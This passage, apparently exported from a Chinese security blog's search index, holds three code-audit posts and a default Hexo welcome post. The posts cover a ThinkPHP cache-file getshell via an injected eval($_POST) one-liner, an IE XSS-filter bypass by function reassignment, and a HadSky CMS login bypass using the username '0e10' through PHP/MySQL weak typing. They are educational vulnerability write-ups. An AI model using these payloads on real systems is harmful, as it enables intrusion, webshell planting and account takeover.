strpos($type,&apos;\\&apos;)? $type : &apos;Think\\Cache\\Driver\\&apos;.ucwords(strtolower($type));            </div><div class="line">    if(class_exists($class))</div><div class="line">        $cache = new $class($options); </div><div class="line">        //  实例化Think\Cache\Driver\FILE</div><div class="line">    else</div><div class="line">        E(L(&apos;_CACHE_TYPE_INVALID_&apos;).&apos;:&apos;.$type);</div><div class="line">    return $cache;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>最后一步写入缓存</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">/**</div><div class="line"> * 写入缓存</div><div class="line"> * @access public</div><div class="line"> * @param string $name 缓存变量名</div><div class="line"> * @param mixed $value  存储数据</div><div class="line"> * @param int $expire  有效时间 0为永久</div><div class="line"> * @return boolean</div><div class="line"> */</div><div class="line">public function set($name,$value,$expire=null) &#123;</div><div class="line">	/*省略*/</div><div class="line">	$filename   =   $this-&gt;filename($name);//生成文件名，理想情况下MD5(&apos;content&apos;)</div><div class="line">   	/*省略*/</div><div class="line">    $data   =   serialize($value);</div><div class="line">    /*省略*/</div><div class="line">    $data    = &quot;&lt;?php\n//&quot;.sprintf(&apos;%012d&apos;,$expire).$check.$data.&quot;\n?&gt;&quot;;</div><div class="line">    $result  =   file_put_contents($filename,$data);</div><div class="line">    /*省略*/</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>关键点在<code>&lt;?php\n//&quot;.sprintf(&#39;%012d&#39;,$expire).$check.$data.&quot;\n?&gt;</code></p>
<p>理想情况下这里的利用条件得天独厚，因为两个尖括号都写好了，不用担心I函数过滤的问题。而其中的data就是传入进去的一句话：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/chapter-5/index.php/home/index/save?content=%2f%2f%0A%20eval%28%24_POST%5B%27c%27%5D%29%3B%23 //写入数据库</div><div class="line">http://127.0.0.1/chapter-5/index.php/home/index/cache	//激活缓存</div></pre></td></tr></table></figure>
<p>在Runtime/Temp下 getshell <img src="捕获4.PNG" alt=""></p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>文中一直提到是理想情况，这里解释一下，跟踪的时候省略了一些代码，其中有的是利用的前提条件，举个例子，文中提到理想情况下webshell文件名是MD5(‘content’)即<code>9a0364b9e99bb480dd25e1f0284c8555</code>/原因是TP中有一个给MD5值加盐的参数可以在配置文件中申明<code>DATA_CACHE_KEY</code>，如果管理员事先设置了这个参数，文件名就会变得不可猜，具体如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">private function filename($name) &#123;</div><div class="line">        $name	=	md5(C(&apos;DATA_CACHE_KEY&apos;).$name);</div><div class="line">        /*省略*/</div><div class="line">        &#125;else&#123;</div><div class="line">            $filename	=	$this-&gt;options[&apos;prefix&apos;].$name.&apos;.php&apos;;</div><div class="line">        &#125;</div><div class="line">        return $this-&gt;options[&apos;temp&apos;].$filename;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>还有一些前提条件，例如Runtime不在web目录内，一般情况也是利用不了的。</p>
<p><strong>如何出错，恳请指点</strong></p>
]]></content>
      
        
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[通过函数重定义绕过xss过滤器(IE)]]></title>
      <url>/2017/08/17/%E9%80%9A%E8%BF%87%E5%87%BD%E6%95%B0%E9%87%8D%E5%AE%9A%E4%B9%89%E7%BB%95%E8%BF%87xss%E8%BF%87%E6%BB%A4%E5%99%A8/</url>
      <content type="html"><![CDATA[<p>这个bypass的方法在近期的版本已经不适用，但是仍然可以在兼容模式下适用，你可以想一些办法强制IE进入兼容模式，例如添加一栏像下面这样，这行代码将使IE的JS引擎回到老旧模式（IE7）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=EmulateIE7&quot; /&gt;</div></pre></td></tr></table></figure>
<p>现在我们需要建立一个实验页面，让用户可控参数出现到JS函数的参数里面。</p>
<p>test.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=EmulateIE7&quot; /&gt;</div><div class="line">&lt;script&gt;</div><div class="line">function x() &#123;</div><div class="line"></div><div class="line">&#125;</div><div class="line">&lt;?php</div><div class="line">$x = isset($_GET[&apos;x&apos;]) ? $_GET[&apos;x&apos;] : &apos;&apos;;</div><div class="line">?&gt;</div><div class="line">x(&apos;&lt;?php echo $x?&gt;&apos;);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>在老版本的IE浏览器里面，是有可能在一个函数的调用参数的地方重定义这个函数的。这将对绕过xss过滤器非常有用（如果你的payload能出现在这里）</p>
<p>通过GET传参<code>somepage.php?x=1&#39;,x=alert,&#39;</code></p>
<p>最后的结果像是这样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=EmulateIE7&quot; /&gt;</div><div class="line">&lt;script&gt;</div><div class="line">function x() &#123;</div><div class="line"></div><div class="line">&#125;</div><div class="line">x(&apos;1&apos;,x=alert,&apos;&apos;);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>这个payload将闭合两边的引号，同时<code>function x</code>重定义为<code>alert</code>因为alert只接受一个参数，所以其他的多余参数将被忽 <img src="xss1.PNG" alt=""></p>
<h2 id="不背翻译的锅"><a href="#不背翻译的锅" class="headerlink" title="不背翻译的锅"></a>不背翻译的锅</h2><p><a href="http://www.thespanner.co.uk/2014/04/07/bypassing-the-xss-filter-using-function-reassignment/" target="_blank" rel="external">http://www.thespanner.co.uk/2014/04/07/bypassing-the-xss-filter-using-function-reassignment/</a></p>
]]></content>
      
        
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[hadsky部分用户任意登录]]></title>
      <url>/2017/08/17/hadsky%E9%83%A8%E5%88%86%E7%94%A8%E6%88%B7%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95/</url>
      <content type="html"><![CDATA[<h2 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h2><p>在注册页面</p>
<p>注册用户  密码为password 其他信息随便填</p>
<p>  <img src="捕获2.PNG" alt=""></p>
<p>在登陆框以用户名0e10（万能用户名） 密码password登录</p>
<p> <img src="捕获.PNG" alt=""></p>
<p>成功登陆</p>
<p> <img src="捕获4.PNG" alt=""> </p>
<h2 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h2><p>该cms有三种登陆方式</p>
<p>用户UID 邮箱 用户名 代码如下</p>
<p>\upload\phpscript\checklogin.php 第6行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">if (Cnum($_POST[&apos;username&apos;])) &#123;</div><div class="line">	//UID登录</div><div class="line">	$__ud = $_G[&apos;TABLE&apos;][&apos;USER&apos;] -&gt; getData($_POST[&apos;username&apos;]);</div><div class="line">	$username = $__ud[&apos;username&apos;];</div><div class="line">&#125; elseif (strpos($_POST[&apos;username&apos;], &apos;@&apos;)) &#123;</div><div class="line">	//邮箱登录</div><div class="line">	$__ud = $_G[&apos;TABLE&apos;][&apos;USER&apos;] -&gt; getData(array(&apos;email&apos; =&gt; $_POST[&apos;username&apos;]));</div><div class="line">	$username = $__ud[&apos;username&apos;]</div><div class="line">&#125; else &#123;</div><div class="line">	//用户名登录</div><div class="line">	preg_match(&apos;/^[\x&#123;4e00&#125;-\x&#123;9fa5&#125;A-Za-z0-9_]+$/u&apos;, $_POST[&apos;username&apos;]) ? $username = $_POST[&apos;username&apos;] : $username = FALSE;</div><div class="line">	if (strlen($username) &gt; 24 || strlen($username) &lt; 3) &#123;</div><div class="line">		$username = FALSE;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里会首先进入Cnum()函数检查</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">function Cnum($str, $return = 0, $int = true, $min = FALSE, $max = FALSE) &#123;</div><div class="line">	if (is_numeric($str)) &#123;</div><div class="line">		//0e10在这里进入</div><div class="line">		if ($int)</div><div class="line">			$str = (int)$str;</div><div class="line">	&#125; else &#123;</div><div class="line">		$str = $return;</div><div class="line">	&#125;</div><div class="line">	if ($min !== FALSE)</div><div class="line">		if ($str &lt; $min)</div><div class="line">			$str = $return;</div><div class="line">	if ($max !== FALSE)</div><div class="line">		if ($str &gt; $max)</div><div class="line">			$str = $return;</div><div class="line"></div><div class="line">	return $str;</div><div class="line">	//return 0</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个函数的功能是检验是否位数字,0e10的用户名经过is_numberic()判断returu，最后int()后，以 return 0返回</p>
<p>问题就出在这里 if (Cnum($_POST[‘username’]))  看到返回值是0会认为他不是数字（实际上是的嘛只是科学记数法而已）,于是绕过UID登录方式，0e10显然也不符合邮箱格式，于是进入else被当成了用户名来验证。0e10符合用户名的格式，于是接下来进入用户存在性检验。</p>
<p> \upload\phpscript\checklogin.php 第25行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if (!$username || !$password)</div><div class="line">	$chkr = &apos;请填入正确的登录信息&apos;;</div></pre></td></tr></table></figure>
<p>如果开始直接输入0，会在这里报错，但是0e10不会目测<strong>PHP弱类型</strong>的原因~</p>
<p> \upload\phpscript\checklogin.php 第34行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//检验数据库中是否有相应用户名</div><div class="line">$trylogindata = $_G[&apos;TABLE&apos;][&apos;USER&apos;] -&gt; getData(array(&apos;username&apos; =&gt; $username));</div></pre></td></tr></table></figure>
<p>跟进getData()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">public function getData($field = NULL, $str = NULL) &#123;</div><div class="line">	/*省略*/</div><div class="line">	if (Cnum($field, FALSE)) &#123;</div><div class="line">		$sql = &quot;where `id`=&#123;$field&#125;&quot;;</div><div class="line">	&#125; else &#123;</div><div class="line">		$sql = $this -&gt; getSql($field, $str);</div><div class="line">	&#125;</div><div class="line">	$query = mysql_query(&quot;select * from `&#123;$this-&gt;mysql_prefix&#125;&#123;$this-&gt;table&#125;` &#123;$sql&#125;&quot;);</div><div class="line">&#125;/*省略*/</div></pre></td></tr></table></figure>
<p>跟进getSql()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">public function getSql($field, $str = NULL) &#123;</div><div class="line">	/*省略*/</div><div class="line">	&#125; elseif (is_array($field) &amp;&amp; $str == NULL) &#123;</div><div class="line">		foreach ($field as $key =&gt; $value) &#123;</div><div class="line">			if (Cstr($key, FALSE, TRUE, 1, 255))</div><div class="line">				$sql .= &quot;`&#123;$key&#125;`=&quot; . mysqlstr($value) . &quot; and &quot;;//无引号保护</div><div class="line">		&#125;</div><div class="line">&#125;/*省略*/</div></pre></td></tr></table></figure>
<p>这里mysqlstr($value)没有引号保护直接拼接进去，最终执行SQL语句如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from `pk_user` where `username`=0e10</div></pre></td></tr></table></figure>
<p>由于MYSQL的弱类型的关系（0=任何字符串）因为<code>username</code>字段是是字符串，所以只要数据库里有一条数据，那么<code>getData(array(&#39;username&#39; =&gt; $username));</code>就会返回数据给<code>$trylogindata</code></p>
<p>\upload\phpscript\checklogin.php 第52行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if ($trylogindata) &#123;</div><div class="line">	/*$trylogindata为真则进入用户密码检验*/</div></pre></td></tr></table></figure>
<p>由于<code>$trylogindata</code>存在，所以进入if语句</p>
<p> \upload\phpscript\checklogin.php 第52行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//检验密码是否正确</div><div class="line">$userdata = UserLogin(array(&apos;username&apos; =&gt; $username, &apos;password&apos; =&gt; md5($password)));</div></pre></td></tr></table></figure>
<p>跟进UserLogin()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">function UserLogin($chkuserloginarray, $chkloginqx = true) &#123;</div><div class="line">	global $_G;</div><div class="line">	$userdata = $_G[&apos;TABLE&apos;][&apos;USER&apos;] -&gt; getData($chkuserloginarray);</div><div class="line">	/**省略**/</div></pre></td></tr></table></figure>
<p>这里检验用户名，密码依然是getData()函数</p>
<p>最后执行SQL语句就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from `pk_user` where `username`=0e10 and password = &apos;xxxxxxxxx&apos;</div></pre></td></tr></table></figure>
<p>所以只要数据库中存在密码，就能登陆拥有相应密码的第一个用户（万能用户名）。</p>
<p>一句话总结一：未加引号保护时，MYSQL+PHP弱类型引起的登陆逻辑漏洞</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>1、厂商原话：<strong>系统开源的，也希望大家多多支持，能把发现的问题发给我</strong></p>
<p>2、个人能力有限，如有错误还请师傅们多多指教</p>
]]></content>
      
        
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>/2017/08/17/hello-world/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
]]></content>
      
        
    </entry>
    
  
  
</search>
